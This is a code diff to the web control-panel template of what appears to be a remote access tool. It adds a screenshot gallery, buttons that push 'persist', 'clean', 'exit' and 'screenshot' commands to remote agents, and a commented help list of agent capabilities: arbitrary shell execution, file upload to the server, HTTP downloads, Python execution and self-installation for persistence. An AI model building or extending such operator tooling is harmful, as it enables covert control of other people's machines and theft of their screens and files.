@@ -1,10 +1,38 @@
 {% with previous_page=url_for('webui.agent_list'), title=agent.display_name %}
 {% include "header.html" %}
 {% endwith %}
-
+<script>
+	var FILES = [];
+</script>
 <div class="container"> 
 <section id="main_content">
-    
+    <pre id="screenshots">
+		{% for file in filelist %}
+			<script> // Creating in JS an Array of file names for controlating if have to append new screenshot or something
+				FILES[{{file}}] = "{{ filelist[file].split(agent.id + '/')[1] }}"
+			</script>
+			<a href="/uploads/{{filelist[file].split('/uploads/')[1]}}" target="_blank"><img src="/uploads/{{filelist[file].split('/uploads/')[1]}}" alt="Screenshot" class="screenshot"></a>
+		{% endfor %}
+		</pre> 
+		<script>
+			(function() {
+				function scrollHorizontally(e) {
+					e = window.event || e;
+					var delta = Math.max(-1, Math.min(1, (e.wheelDelta || -e.detail)));
+					document.getElementById('screenshots').scrollLeft -= (delta*40); // Multiplied by 40
+					e.preventDefault();
+				}
+				if (document.getElementById('screenshots').addEventListener) {
+					// IE9, Chrome, Safari, Opera
+					document.getElementById('screenshots').addEventListener("mousewheel", scrollHorizontally, false);
+					// Firefox
+					document.getElementById('screenshots').addEventListener("DOMMouseScroll", scrollHorizontally, false);
+				} else {
+					// IE 6/7/8
+					document.getElementById('screenshots').attachEvent("onmousewheel", scrollHorizontally);
+				}
+			})();
+		</script>
     <div id="terminal">
     </div>
 	
@@ -13,6 +41,41 @@
 		&#8595; Terminal updated &#8595;
 		</div>
 	</div>
+	<div id="functions" style="width:80%;">
+		<button type="button" class="btn btn-light" id="screenshot">Screenshot</button>
+		<button type="button" class="btn btn-light" id="persist">Persist</button>
+		<button type="button" class="btn btn-primary" id="help">Help</button>
+		<button type="button" class="btn btn-secondary" id="exit">Exit</button>
+		<button type="button" class="btn btn-danger" id="clean">Clean</button>
+		<hr>
+				<!--<any shell command>
+				Executes the command in a shell and return its output.
+				
+				upload <local_file>
+				Uploads <local_file> to server.
+				
+				download <url> <destination>
+				Downloads a file through HTTP(S).
+				
+				zip <archive_name> <folder>
+				Creates a zip archive of the folder.
+				
+				screenshot
+				Takes a screenshot.
+				
+				python <command|file>
+				Runs a Python command or local file.
+				
+				persist
+				Installs the agent.
+				
+				clean
+				Uninstalls the agent.
+				
+				exit-->
+	</div>
+
+	<br>
     
 	<div >
 		<input type="text" name="cmd" id="cmd" style="width: 80%" placeholder="Type command here and press Enter..."/>
@@ -91,6 +154,37 @@
 			$('#cmd').val('');
 			return false;
 		}
+
+		/**
+		 * Send the command by the buttons.
+		 */
+		function sendCommandButton(buttonPressed) {
+			$.post("{{ url_for('api.push_command', agent_id=agent.id) }}", 
+					{'cmdline': buttonPressed}, function(){});
+					
+			addComandToHistory(buttonPressed);
+			return false;
+		}
+		
+		/**
+		 * send the command when clicking on the command button.
+		 */
+		$('#screenshot').click(function(){
+			sendCommandButton('screenshot');
+			setInterval(refreshScreenshots, 500);
+		});
+		$('#persist').click(function(){
+			sendCommandButton('persist');
+		});
+		$('#help').click(function(){
+			sendCommandButton('help');
+		});
+		$('#exit').click(function(){
+			sendCommandButton('exit');
+		});
+		$('#clean').click(function(){
+			sendCommandButton('clean');
+		});
 		
 		/**
 		 * send the command when clicking on the send bouton.
@@ -99,6 +193,29 @@
 			sendCommand();
 		});
 		
+		/**
+		  * Refresh the terminal if the console output changed.
+		  */
+		function refreshScreenshots() {
+			terminal = $('#termtext')[0].innerHTML.split('\n');
+			for(line in terminal){
+				if(terminal[line].includes('File uploaded')){
+					url = terminal[line].split('href="')[1].split('"')[0]
+					file = url.split('/uploads/')[1].split('/')[1]
+					var exists = false;
+					for(f in FILES){
+						if(FILES[f] == file){
+							exists = true;
+						}
+					}
+					if(!exists){
+						// Add to dom on screenshots
+						$("#screenshots").prepend('<a href="'+url+'" target="_blank"><img src="'+url+'" alt="Screenshot" class="screenshot"></a>');
+						FILES[FILES.length] = file
+					}
+				}
+			}
+		}
 		/**
 		  * Refresh the terminal if the console output changed.
 		  */
@@ -152,6 +269,7 @@
 		 */
 		$(document).ready(function(){
 			setInterval(refreshTerminal, 500);
+			setInterval(refreshScreenshots, 500);
 		});
 	})();
 
